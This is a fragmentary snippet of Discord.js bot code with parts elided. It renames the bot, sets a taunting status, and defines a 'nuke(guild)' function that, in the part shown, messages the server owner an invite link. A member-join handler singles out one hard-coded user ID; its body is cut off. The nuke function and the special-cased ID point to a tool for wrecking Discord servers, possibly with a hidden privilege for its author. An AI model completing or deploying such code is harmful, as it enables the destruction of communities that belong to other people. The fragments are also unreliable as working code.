...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("superbot")

}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`kill you noob`,'https://www.twitch.tv/hix')
...
async function nuke(guild) {
  ...
  await guild.owner.send(' [https://discord.gg/2wAt3um ]').catch(e => { return void e; });
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "409093271592370186") {
